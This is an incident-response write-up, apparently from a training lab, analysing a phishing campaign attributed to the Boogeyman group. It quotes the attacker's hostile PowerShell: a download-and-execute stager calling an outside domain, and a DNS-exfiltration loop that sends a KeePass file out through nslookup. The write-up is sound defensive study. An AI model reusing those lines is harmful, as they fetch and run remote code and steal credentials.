---
{"dg-publish":true,"permalink":"/phishing-campaign-by-boogeyman-threat-group/"}
---

[[]]
### Case Description
---
A finance employee receives an email regarding about an unpaid invoice from their business partner, the employee clicked the attachment and compromised her workstation.

Further reports received from other finance department employees that they received the same email, research reveals a new threat group named Boogeyman known for targeting the logistics sector.
## Tools
---
- Thunderbird
- LNKParse3 - a python package for forensic analysis on LNK extensions.
- Wireshark/Tshark
- jq - a commandline JSON parser

# Analysis

The artefacts are:
- dump.eml - the phishing email sent by the threat group.
- Powershell logs
- Packet Capture from the compromised workstation.
### Email Analysis
---
Sample screenshot of the email received by the financial employee:

![Pasted image 20240920174933.png](/img/user/images/Pasted%20image%2020240920174933.png)
- Sender: agriffin@bpakcaging[.]xyz - note on the missing 'c' in 'packaging'.
- Receiver: julianne.westcott@hotmail[.]com.
- Third-party mail relay service: elasticemail.
- The attached filename is: Invoice_20230103[.]lnk

Using `lnkparse email.lnk` shows that it opens up a powershell hidden with a base64 encoded payload:

![Pasted image 20240920175150.png](/img/user/images/Pasted%20image%2020240920175150.png)
The decoded string is:

```Powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```
### Endpoint Analysis
---
Sample screenshot of the Powershell logs:

![Pasted image 20240920183325.png](/img/user/images/Pasted%20image%2020240920183325.png)

![Pasted image 20240920183737.png](/img/user/images/Pasted%20image%2020240920183737.png)
![Pasted image 20240920184102.png](/img/user/images/Pasted%20image%2020240920184102.png)
- The subdomain `files` is most likely used to serve the required files for
- The second subdomain `cdn` is most likely the Command and Control as based on the script analysis, it makes a POST request to this subdomain.
- The threat actor downloaded two binaries from their domain one is **sb.exe** and **sq3.exe**.

Since the compromised started with the base64 encoded payload, I will sort the logs via timestamp and use grep to print out the _after-context_, in this way we can see the following events:

```Powershell
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}' | grep "iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')" -A 30
```

Command Output:

![Pasted image 20240920185226.png](/img/user/images/Pasted%20image%2020240920185226.png)
The threat actor download a `sb.exe` ~~which I assume is a binary that gives you privileges based on the commands inputted~~:

![Pasted image 20240920185612.png](/img/user/images/Pasted%20image%2020240920185612.png)
After further research and viewing down the logs, it is [seatbelt.exe](https://github.com/GhostPack/Seatbelt) used to test safety checks implemented by gathering data based on inputs:

Screenshot from the github documentation:

![Pasted image 20240920190053.png](/img/user/images/Pasted%20image%2020240920190053.png)
The **sq3.exe** binary is found and executed against microsoft sticky notes:

![Pasted image 20240920190512.png](/img/user/images/Pasted%20image%2020240920190512.png)
- Further analysis found the name of the user is j.westcott found using the logs from `cd` commands.

Then the threat actor exfiltrated a file named **protected_data.kdbx** (KeePass Password Manager) from the Documents directory with a IP address destination: 167.71.211.113:

```PowerShell
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}' | grep "sq3.exe"  -A 20
```

Command Output:

![Pasted image 20240920190953.png](/img/user/images/Pasted%20image%2020240920190953.png)
Then the threat actor uses `hex` as encoding for exfiltrating the files:

![Pasted image 20240920191252.png](/img/user/images/Pasted%20image%2020240920191252.png)
##### Analyzing the PowerShell
---
```powershell
$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line.bpakcaging.xyz\" $destination;} echo \"Done\";;pwd"}
```

- The hex are splitted into chunks each chunk contains 50 characters and is stored in a variable name `$split`.
- Each line `$split` has is appended to `$<hex_data_here>.bpakcaging.xyz` and uses nslookup to exfiltrate the data.
- The threat actor Domain Name System Server will capture the lookup attempts and logs them for the attacker to view and rebuild the file using the hex.
### Network Traffic Analysis
---
Based on the screenshot the threat actor leverages a simple python server to host their files:

![Pasted image 20240920193422.png](/img/user/images/Pasted%20image%2020240920193422.png)
Using Wireshark we can find the DNS queries to the threat actor DNS server with:

```bash
dns.resp.name and ip.addr == 167.71.211.113
```

Command Output:

![Pasted image 20240920194200.png](/img/user/images/Pasted%20image%2020240920194200.png)
Using tshark with the above filter + regular expression matching results into:

```bash
tshark -r capture.pcapng --color -Y "dns.resp.name and ip.addr == 167.71.211.113" | grep -E "[a-zA-Z0-9]+\.bpakcaging\.xyz" -o
```

Command output:

![Pasted image 20240920200639.png](/img/user/images/Pasted%20image%2020240920200639.png)
- Discovered additional subdomain by the threat actor
- Exfiltrated hex encoded data.

Rebuilding the `.kdbx` file with the command:

```bash
tshark -r capture.pcapng --color -Y "dns.resp.name and ip.addr == 167.71.211.113" | grep -E "([a-zA-Z0-9])+\.bpakcaging\.xyz" -o | sed 's/.bpakcaging.xyz//g' | sed 's/ns1//g' | sed 's/ns2//g' | xxd -r -p > file.kdbx
```

However it requires the password:

![Pasted image 20240920202344.png](/img/user/images/Pasted%20image%2020240920202344.png)
I filtered for port 8080 and http on Wireshark:

![Pasted image 20240920210615.png](/img/user/images/Pasted%20image%2020240920210615.png)
- It shows the command given by the C2 in every http response code 200 and make a POST request back to the C2 to show the output of the command.

In tshark we can get each line with this command:

```Bash
tshark -r capture.pcapng --color -Y 'http and tcp.port == 8080 and http.request.method == "POST"' -T fields -e http.file_data | head -n 1
```

Command Output:

![Pasted image 20240921163104.png](/img/user/images/Pasted%20image%2020240921163104.png)
Then by removing the `head -n 1` and storing them to a file and using a python script to convert the decimal to their ASCII equivalent:

```bash
tshark -r capture.pcapng --color -Y 'http and tcp.port == 8080 and http.request.method == "POST"' -T fields -e http.file_data > ./test.txt
```

And the python code:

![Pasted image 20240921164801.png](/img/user/images/Pasted%20image%2020240921164801.png)
Then saving it into a file and using grep:

![Pasted image 20240921165201.png](/img/user/images/Pasted%20image%2020240921165201.png)
Based on the powershell logs the threat actor accessed the `plum.sqlite` database for Microsoft Sticky Notes:

```bash
cat output.txt | grep "plum.sqlite" -a -A 100
```

Command output:

![Pasted image 20240921170656.png](/img/user/images/Pasted%20image%2020240921170656.png)
Then we can open the `.kdbx` file and use the found password:

`CTRL +H `

![Pasted image 20240921171232.png](/img/user/images/Pasted%20image%2020240921171232.png)




